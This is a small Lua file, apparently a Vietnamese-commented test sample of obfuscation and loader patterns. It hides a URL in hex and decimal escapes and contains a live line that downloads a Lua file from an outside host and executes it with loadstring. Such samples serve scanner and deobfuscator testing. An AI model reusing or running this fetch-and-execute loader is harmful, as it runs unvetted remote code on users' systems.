-- Mẫu thử nghiệm Lua Obfuscated & Loader
local _str_table = {"Hello", "World", "Security"}
local greeting = _str_table[1] .. " " .. _str_table[2]

-- Chuỗi thoát Hex và Decimal
local secret_api = "\104\116\116\112\115\058\047\047\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d" .. "/api/v1/auth"

-- Cấu trúc Loader HttpGet
loadstring(game:HttpGet("https://hune205.dev/api/v5/files/6a0949ca41406c5e219e2845.lua"))()

function testAction()
if true then
print(greeting)
print(secret_api)
end
end
